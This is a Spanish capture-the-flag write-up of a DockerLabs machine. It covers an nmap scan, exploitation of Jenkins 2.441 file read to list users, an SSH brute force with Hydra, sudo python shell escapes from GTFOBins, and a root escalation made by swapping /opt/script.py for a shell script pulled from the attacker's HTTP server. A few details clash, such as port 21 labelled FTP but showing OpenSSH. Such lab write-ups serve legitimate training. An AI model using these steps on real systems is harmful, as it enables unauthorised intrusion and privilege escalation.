# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/9445b28f-53ba-41a7-984d-5e9e79d71696)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **21/tcp(FTP):** OpenSSH 9.2p1
2.  **8080/tcp(HTTP):** Jetty 10.0.18
### Puerto 8080
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a una pagina de inicio de sesión de Jenkins.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/1c2c75b7-dc18-42f3-b66d-c5b4b4e30fb3)

# Fase 2- Exploración

#### Feroxbuster
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/21b143cb-80ea-4b71-83d2-4369b5386053)
Con Feroxbuster encontramos una especie de panel de control. Y abajo nos dice la versión de Jenkins 2.441. 

#### 2.441
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c7db52ed-e7f3-4f46-b7f5-c5dd3868b504)
Con Searchsploit encontramos un local file Inclusion en esa versión. 

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5c5bc613-b829-4d78-af2e-e5e3837082c1)
Y en GitHub encontramos un Arbitrary File Read.

# Fase 3- Explotación

#### 51993.py
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d454c258-9642-4fe3-8606-3a3accd0c9e1)

Usamos el de Searchsploit para leer el /etc/passwd y enumerar posibles usuarios. Vemos los usuarios `pinguinito` y `bobby`.

#### Hydra
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/db5f4017-1e5a-497f-9ec9-ba46152f2aeb)

Realizamos un ataque de fuerza bruta al puerto 22, al usuario Bobby, y su contraseña es chocolate.

# Fase 4- Privilegios

#### Bobby
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/dacfff3b-416f-4e6a-8b9c-6a243fffbd84)

Al usar `sudo -l` vemos que podemos usar el binario python3 como el usuario `pinguinito`.

#### Gtfobins
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/19738933-1c64-4c36-8b81-bfb2ceb42c58)

Nos dirigimos a gtfobins y nos dice que para escalar al usuario pinguinito tenemos que usar el siguiente comando: 
```python
sudo python -c 'import os; os.system("/bin/sh")'
```
Como ese comando no funciono, usamos este:
```python
sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

#### Pinguinito
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/11fccb95-bd8b-4c45-bf02-36fdadf39604)

Ahora como el usuario pinguinito podemos usar el binario python3 y un archivo que se encuentra en /opt/script.py.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/8725a7a4-cfa0-4f7f-8b58-b379fc16a7b4)
Lo que hice fue, cambiar el nombre del archivo script.py original a ss.py, crear un archivo en mi maquina atacante llamado script.py que contenga lo siguiente:
```python
import os
os.system("/bin/bash")
```
Y con python usando el comando: `python -m http.server 80` me descargue en la maquina victima usando curl el fichero que cree.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/51ebc99a-1be7-4854-ba76-4bf6c64ec424)

Y ejecutando el archivo con el comando:
```python
sudo -u root /usr/bin/python3 /opt/script.py
```
Escalamos a root!
